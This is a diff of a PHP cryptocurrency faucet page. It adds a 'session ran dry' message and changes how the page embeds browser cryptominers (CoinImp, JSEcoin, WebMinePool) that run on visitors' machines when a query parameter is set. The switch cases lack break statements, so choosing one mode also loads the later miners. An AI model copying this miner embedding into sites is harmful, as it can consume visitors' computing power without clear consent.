@@ -743,7 +743,6 @@ table, th, td {
           }
           echo '<dl><dt>Status</dt><dd>' . htmlspecialchars($result['status'], ENT_QUOTES|ENT_SUBSTITUTE|ENT_DISALLOWED|ENT_HTML5) . '</dd><dt>Message</dt><dd>' . htmlspecialchars($result['message'], ENT_QUOTES|ENT_SUBSTITUTE|ENT_DISALLOWED|ENT_HTML5) . '</dd></dl>';
         }
-      }
     } else {
       if ($cfg_enable_google_analytics) {
         echo '<script type="text/javascript">';
@@ -753,6 +752,8 @@ table, th, td {
       echo $errmsg;
     }
   }
+  if($limit == true){echo '<h1>your faucet session has ran dry</h1> <h3>please go back to <a href="'.$cfg_site_url.'">'.$cfg_site_url. '</a> to start the session again.</h3>';}
+      }
 ?>
 <hr/>
 <p><strong>Do not bookmark this page!</strong> Use <a href="<?php echo $cfg_site_url; ?>"><?php echo htmlspecialchars($cfg_site_url, ENT_QUOTES|ENT_SUBSTITUTE|ENT_DISALLOWED|ENT_HTML5); ?></a> instead. (If the claim URL changes and you visit this page directly, you might be mistaken for a bot and banned.)</p>
@@ -818,7 +819,7 @@ eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
 </script>
   <?php if (isset($_GET['miner']))  {  
       switch($cfg_miner_mode){
-    case "iframe omly":
+    case "iframe only":
           echo "$cfg_iframe_code";
     case "coinimp":
     echo '<script src="https://www.hostingcloud.racing/8B9U.js"></script>
@@ -831,8 +832,13 @@ eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
     </script>';
 
     case "jsecoin":
-    echo '<script type="text/javascript">
-!function(){window.JSENoAds=1;var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/'.$cfg_jse_account_number.'/'.$cfg_url.'/0/0/",s.parentNode.insertBefore(t,s)}();
+    echo '
+<script src="https://load.jsecoin.com/load/'.$cfg_jse_account_number.'/'.$cfg_url.'/0/0/" async defer></script>';
+case "wmpcoin":
+    echo '<script src="https://www.webminepool.com/lib/base.js"></script>
+<script>
+    var miner = WMP.Anonymous('.chr(39).$cfg_wmp_site_key.chr(39).');
+    miner.start();
 </script>';
 }
 }  ?>
